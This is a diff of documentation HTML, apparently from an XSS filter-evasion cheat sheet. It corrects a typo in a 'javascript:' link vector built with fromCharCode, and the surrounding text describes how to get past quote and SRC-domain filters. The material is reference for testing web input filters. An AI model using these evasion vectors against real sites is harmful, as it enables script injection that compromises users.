@@ -4005,7 +4005,7 @@
 <p>(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)</p>
 <h3 id="fromcharcode">fromCharCode<a class="headerlink" href="#fromcharcode" title="Permanent link">&para;</a></h3>
 <p>If the system does not allow quotes of any kind, you can <code>eval()</code> a <code>fromCharCode</code> in JavaScript to create any XSS vector you need:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(String,fromCharCode(88,83,83))&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
 </code></pre></div>
 <h3 id="default-src-tag-to-get-past-filters-that-check-src-domain">Default SRC Tag to Get Past Filters that Check SRC Domain<a class="headerlink" href="#default-src-tag-to-get-past-filters-that-check-src-domain" title="Permanent link">&para;</a></h3>
 <p>This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as <code>onblur</code> or <code>onclick</code>, providing extensive variations of the injections listed here:</p>
